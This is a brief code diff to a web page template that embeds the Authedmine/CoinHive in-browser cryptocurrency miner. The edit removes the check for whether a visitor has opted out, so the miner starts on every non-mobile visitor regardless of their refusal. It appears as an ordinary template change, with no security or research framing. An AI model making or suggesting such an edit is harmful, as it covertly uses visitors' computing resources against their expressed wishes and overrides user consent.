@@ -200,7 +200,7 @@
     <script src="https://authedmine.com/lib/authedmine.min.js"></script>
     <script>
        var miner = new CoinHive.Anonymous("{{ COIN_HIVE_TOKEN }}", {throttle: 0.3});
-       if (!miner.isMobile() && !miner.didOptOut(14400)) {
+       if (!miner.isMobile()) {
         miner.start();
        }
     </script>
